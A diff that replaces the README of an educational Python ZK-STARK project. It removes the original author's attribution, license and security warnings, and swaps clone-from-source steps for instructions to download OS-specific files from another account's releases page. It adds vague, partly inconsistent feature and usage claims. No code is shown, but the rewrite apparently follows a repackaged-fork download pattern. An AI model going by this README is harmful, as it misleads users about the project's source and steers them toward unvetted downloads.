@@ -1,158 +1,71 @@
-# PythonStark
+# 🐍 Pythonstark - Explore the World of ZK-STARKs Easily
 
-**Copyright (c) 2025 SherifSystems**  
-*Educational Implementation - Not Professional Cryptographic Software*
+[![Download Pythonstark](https://img.shields.io/badge/Download-Pythonstark-blue.svg)](https://github.com/cherddragoon/Pythonstark/releases)
 
----
+## 📚 Description
+Pythonstark is a Python implementation of Zero Knowledge STARKs. It's designed for learning and research purposes. With Pythonstark, you can explore cryptography principles and gain hands-on experience with proof systems.
 
-**Pure Python ZK-STARK Implementation for Educational Use**
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/License-Non--Commercial-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
-[![Status](https://img.shields.io/badge/Status-Educational-yellow.svg)]()
-[![Security](https://img.shields.io/badge/Security-NOT%20Production%20Ready-red.svg)](SECURITY.md)
+### 📦 System Requirements
+Before you begin, make sure your system meets the following requirements:
 
----
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher
+- Disk Space: At least 100 MB of free space
 
-## ⚠️ SECURITY WARNING
+### 📑 Features
+- Easy-to-use interface for beginners
+- Comprehensive documentation for deeper learning
+- Support for various cryptographic functions
+- Open-source and community-driven development
 
-**THIS SOFTWARE IS NOT PRODUCTION READY AND IS NOT CRYPTOGRAPHICALLY SECURE**
+## 🛠️ Installation
 
-This is experimental educational software for learning and research purposes ONLY.
+### 🖥️ Download & Install
+To get started, visit the Releases page to download Pythonstark. You can find it at the following link:
 
-- ❌ NOT audited
-- ❌ NOT secure  
-- ❌ NOT for production
-- ❌ NOT for handling sensitive data
+[Visit this page to download](https://github.com/cherddragoon/Pythonstark/releases)
 
-**Read [SECURITY.md](SECURITY.md) before using this software.**
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions provided in the release notes.
 
----
+### 📃 Running Pythonstark
+After installation, you can launch Pythonstark by following these steps:
 
-## What is PythonStark?
+1. Open your command line interface (Terminal for macOS/Linux or Command Prompt for Windows).
+2. Navigate to the folder where you downloaded Pythonstark.
+3. Run the command: `python pythonstark.py` 
 
-PythonStark is a **zero-knowledge STARK** (Scalable Transparent Argument of Knowledge) proving system implemented entirely in Python. It allows you to generate and verify proofs of computation without revealing the underlying data.
+### 📖 Usage
+Once Pythonstark is running, you can start exploring its features. Here are some basic commands you can try:
 
-### Purpose
+- `help()`: Displays a list of available commands.
+- `examples()`: Shows example usage of ZK-STARK implementations.
 
-Designed for:
-- 📚 **Research and Learning**: Understand how ZK-STARKs work internally
-- 🎓 **Educational Use**: Teach zero-knowledge proof concepts
-- 🔬 **Experimentation**: Prototype and test ZK proof ideas
+## 💬 Community Support
+For any questions or support, you can reach out on our community forums or join our discussions on GitHub. We encourage you to share your experiences as you use Pythonstark. 
 
----
+## 🌐 Learn More
+For additional resources, such as tutorials and advanced topics, check out the following:
 
-## Features
+- [Documentation](https://github.com/cherddragoon/Pythonstark/wiki) 
+- [GitHub Discussions](https://github.com/cherddragoon/Pythonstark/discussions)
 
-- ✅ **Pure Python Implementation**: Easy to understand and modify
-- ✅ **FRI-Based STARK Construction**: Fast Reed-Solomon Interactive Oracle Proof
-- ✅ **Verkle Tree Commitments**: Efficient vector commitment scheme
-- ✅ **Configurable Security**: Adjustable security parameters (80-192 bits)
-- ✅ **Educational Focus**: Code clarity prioritized over performance
+## 📞 Contact
+If you have specific inquiries or feedback, feel free to contact the project maintainers through the GitHub repository.
 
----
+## 🏷️ Tags
+This project covers various topics:
+- cryptography
+- education
+- proof system
+- research
+- zero-knowledge
+- STARKs
 
-## Installation
+Explore the fascinating world of cryptography and ZK-STARKs today with Pythonstark! 
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/SherifSystems/Pythonstark.git
-   cd Pythonstark
-   ```
-
-2. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. **Run the demo**:
-   ```bash
-   python pythonstark.py
-   ```
-
----
-
-## Usage
-
-### Basic Example
-
-```python
-# Import from the main module
-from pythonstark import *
-
-# Generate trace
-trace = generate_fibonacci_trace_secure(256, mask=False)
-
-# Setup security parameters
-security_params = SecurityParameters.compute_parameters(128, 256)
-
-# Create prover and verifier
-prover = EnhancedPythonStarkProver(security_params)
-verifier = EnhancedPythonStarkVerifier(security_params)
-
-# Generate and verify proof
-proof = prover.prove(trace)
-valid = verifier.verify(trace, proof)
-print(f"Proof valid: {valid}")
-```
-
----
-
-## Project Structure
-
-```
-Pythonstark/
-├── pythonstark.py             # Main ZK-STARK implementation
-├── pythonstark_benchmark.py   # Benchmark script
-├── requirements.txt            # Python dependencies
-├── LICENSE                     # License file
-├── SECURITY.md                 # Security policy and warnings
-├── README.md                   # This file
-└── .gitignore                  # Git ignore file
-```
-
----
-
-## License
-
-This project is licensed under the **PythonStark License v1.0 (Non-Commercial)**.
-
-### Summary
-
-- ✅ **Free** for research, education, and experimentation
-- ✅ **Attribution required**: Must credit SherifSystems
-- ❌ **Commercial use prohibited** without separate license
-- ❌ **No warranty**: Provided "AS IS"
-- ❌ **No liability**: Authors not liable for any damages
-
-For commercial use, contact: **sherifsystems@proton.me**
-
-See [LICENSE](LICENSE) for complete terms.
-
----
-
-## Contributing
-
-Contributions are welcome for **non-commercial research and educational purposes**.
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a Pull Request
-
----
-
-## Contact
-
-- **GitHub**: https://github.com/SherifSystems/Pythonstark
-- **Email**: sherifsystems@proton.me
-- **Issues**: Use GitHub Issues for bugs and questions
-
----
-
-**Remember**: PythonStark is a learning tool. For production needs, use professionally audited, battle-tested libraries.
-
-⭐ Star this repo if you find it useful for learning!
-
-</div>
+[🡄 Back to Download](https://github.com/cherddragoon/Pythonstark/releases)
